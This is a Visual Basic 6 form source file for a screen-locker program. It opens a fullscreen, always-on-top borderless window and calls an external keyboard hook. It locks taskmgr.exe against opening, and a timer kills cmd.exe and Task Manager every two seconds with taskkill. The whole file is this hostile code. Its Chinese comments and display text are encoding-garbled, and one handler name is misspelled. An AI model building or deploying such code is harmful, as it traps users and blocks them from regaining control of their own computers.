VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   16200
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   28740
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   ScaleHeight     =   16200
   ScaleWidth      =   28740
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  '����ȱʡ
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      BackColor       =   &H80000017&
      ForeColor       =   &H0000FFFF&
      Height          =   17175
      Left            =   0
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   0
      Width           =   30015
   End
   Begin VB.Timer Timer1 
      Interval        =   2000
      Left            =   480
      Top             =   360
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Const SWP_NOMOVE = &H2
Private Const SWP_NOSIZE = &H1
Private Const HWND_TOPMOST = -1
Private Sub From_KeyPress()
KeyAscii = 0
End Sub
'�����ڵ�BorderStyle����Ϊ1 ���� 0(ʹ�����С��ʧЧ)
'ͬʱ��Moveable����ΪFalse(���ڲ����ƶ�)
Private Sub Form_Load()
Text1.Text = "���ְ���"
Text1.FontSize = 100
HooK
Dim mfile As String
mfile = VBA.Environ("windir ")
mfile = mfile & "\system32\taskmgr.exe "
Open mfile For Input Lock Read Write As #1
Me.Left = 0: Me.Top = 0
Me.Width = Screen.Width: Me.Height = Screen.Height
SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, &H2 Or &H1
End Sub
Private Sub Form_Unload(Cancal As Integer)
UnHooK
End Sub

Private Sub Text1_Change()
Text1.FontSize = 100
End Sub

Private Sub Timer1_Timer()
Shell "taskkill /im cmd.exe"
Shell "taskkill /im taskmgr.exe"
End Sub
